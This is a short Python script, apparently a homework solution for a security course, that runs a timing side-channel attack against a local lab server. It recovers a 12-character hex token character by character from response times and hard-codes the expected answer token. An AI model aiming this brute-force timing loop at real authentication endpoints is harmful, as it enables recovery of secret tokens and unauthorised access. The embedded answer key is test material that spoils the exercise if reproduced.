from requests import post
from timeit import timeit
from functools import partial
import json
import string
from tqdm import tqdm
import random

URL = 'http://0.0.0.0:8080/hw6/ex1'
EMAIL = 'nico@epfl.ch'
NUMBER_TIMEIT = 1
RANDOM_STRING = '12345678910'
TOKEN_LENGTH = 12
SOLUTION = 'b4351d395d2f'

def main():
    
    token = ''
    space = list(string.hexdigits)
    random.shuffle(space)
    
    print(space)

    for i in range(TOKEN_LENGTH):
        elapsed_list = []
        
        for letter in tqdm(space):
            attempt_token_partial = partial(attempt_token, i, letter, token)
            elapsed = timeit(attempt_token_partial, number=NUMBER_TIMEIT) / NUMBER_TIMEIT
            status_code, body = attempt_token_partial()
            elapsed_list.append((letter, elapsed))

            if elapsed > 0.74 * (i + 1):
                break

        max_letter = max(elapsed_list, key=lambda t: t[1])
        print(max_letter)
        print(body)
        token += max_letter[0]
        
        print(token)
    
    print(body)

def attempt_token(i, letter, token):
    new_token = token + letter + RANDOM_STRING[i:]

    print(new_token)

    data = {
        'email': EMAIL,
        'token': new_token
    }

    resp = post(URL, json=data)

    return resp.status_code, resp.text

if __name__ == '__main__':
    main()